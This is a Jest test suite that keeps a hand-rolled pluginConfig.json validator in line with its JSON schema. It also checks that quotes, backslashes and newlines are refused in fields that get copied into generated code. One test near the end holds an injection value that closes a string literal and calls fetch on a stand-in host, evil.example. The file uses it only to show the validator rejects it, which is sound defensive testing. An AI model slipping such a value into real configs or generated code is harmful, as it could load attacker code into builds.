// The build validates pluginConfig.json with a hand-rolled validator (the build
// must not gain a runtime JSON-Schema dependency), and `pnpm plugin doctor`
// reports its verdict as "matches pluginConfig.schema.json". This suite is the
// tripwire that keeps that claim true: the validator's field tables must cover
// exactly the schema's fields, and every value constraint the schema declares
// must actually be enforced.
//
// Same intent as platform/create-ohif/tests/externals-parity.test.mjs — a
// duplicated contract needs a test that fails when one copy moves.
const schema = require('../../pluginConfig.schema.json');
const writePluginImportsFile = require('../../.rspack/writePluginImportsFile.js');

const { validatePluginConfig, validatorTables } = writePluginImportsFile;
const { PLUGIN_FIELDS, PUBLIC_FIELDS, ROOT_KEYS, INTERPOLATED_FIELDS } = validatorTables;

// A minimal valid config; each test overrides one piece of it.
const baseConfig = () => ({
  $schema: './pluginConfig.schema.json',
  extensions: [{ packageName: '@ohif/extension-default' }],
  modes: [{ packageName: '@ohif/mode-longitudinal' }],
});

const JSON_TYPES = { string: 'string', boolean: 'boolean' };

describe('validator ↔ pluginConfig.schema.json structural parity', () => {
  test('root sections match', () => {
    expect(ROOT_KEYS.slice().sort()).toEqual(Object.keys(schema.properties).sort());
    // additionalProperties:false is what makes ROOT_KEYS the complete list.
    expect(schema.additionalProperties).toBe(false);
  });

  test.each([
    ['plugin', PLUGIN_FIELDS],
    ['publicEntry', PUBLIC_FIELDS],
  ])('%s fields and types match', (definition, fields) => {
    const properties = schema.definitions[definition].properties;
    expect(Object.keys(fields).sort()).toEqual(Object.keys(properties).sort());
    expect(schema.definitions[definition].additionalProperties).toBe(false);
    for (const [field, spec] of Object.entries(properties)) {
      expect(fields[field]).toBe(JSON_TYPES[spec.type]);
    }
  });

  test('plugin required fields match', () => {
    // The validator hard-codes ['packageName'] for extensions/modes entries.
    expect(schema.definitions.plugin.required).toEqual(['packageName']);
    const errors = validatePluginConfig({ ...baseConfig(), extensions: [{}] });
    expect(errors.join('\n')).toContain('missing required string field "packageName"');
  });
});

describe('every schema value constraint is enforced by the validator', () => {
  const entriesFor = (definition, field, value) => {
    if (definition === 'plugin') {
      return { ...baseConfig(), extensions: [{ packageName: '@acme/ext', [field]: value }] };
    }
    return { ...baseConfig(), public: [{ packageName: 'pkg', [field]: value }] };
  };

  const constrained = [];
  for (const definition of ['plugin', 'publicEntry']) {
    for (const [field, spec] of Object.entries(schema.definitions[definition].properties)) {
      if (spec.pattern || spec.minLength !== undefined) {
        constrained.push([definition, field, spec]);
      }
    }
  }

  test('the schema still declares constraints to check (guards this suite)', () => {
    expect(constrained.length).toBeGreaterThan(0);
  });

  test.each(constrained)(
    '%s.%s rejects a value violating its schema',
    (definition, field, spec) => {
      if (spec.minLength !== undefined) {
        expect(validatePluginConfig(entriesFor(definition, field, '')).length).toBeGreaterThan(0);
      }
      if (spec.pattern) {
        // Every pattern in this schema excludes a double quote — the character
        // that would break out of the generated JS string literal.
        const violating = `bad"value`;
        expect(new RegExp(spec.pattern).test(violating)).toBe(false);
        expect(
          validatePluginConfig(entriesFor(definition, field, violating)).length
        ).toBeGreaterThan(0);
      }
    }
  );
});

describe('codegen interpolation safety', () => {
  test.each(INTERPOLATED_FIELDS)('%s rejects quotes, backslashes, and newlines', field => {
    for (const value of ['a"b', "a'b", 'a\\b', 'a\nb']) {
      const config = { ...baseConfig(), public: [{ packageName: 'pkg', [field]: value }] };
      expect(validatePluginConfig(config).length).toBeGreaterThan(0);
    }
  });

  test('the injection shape the codegen would emit is refused', () => {
    // `if( module==="<packageName>")` — a quote here closes the literal.
    const config = {
      ...baseConfig(),
      extensions: [{ packageName: '@acme/x") || fetch("//evil.example/x' }],
    };
    const errors = validatePluginConfig(config).join('\n');
    expect(errors).toMatch(/quote, backslash, or newline|does not match the schema pattern/);
  });
});

describe('the shipped pluginConfig.json passes', () => {
  test('no errors', () => {
    expect(validatePluginConfig(require('../../pluginConfig.json'))).toEqual([]);
  });
});
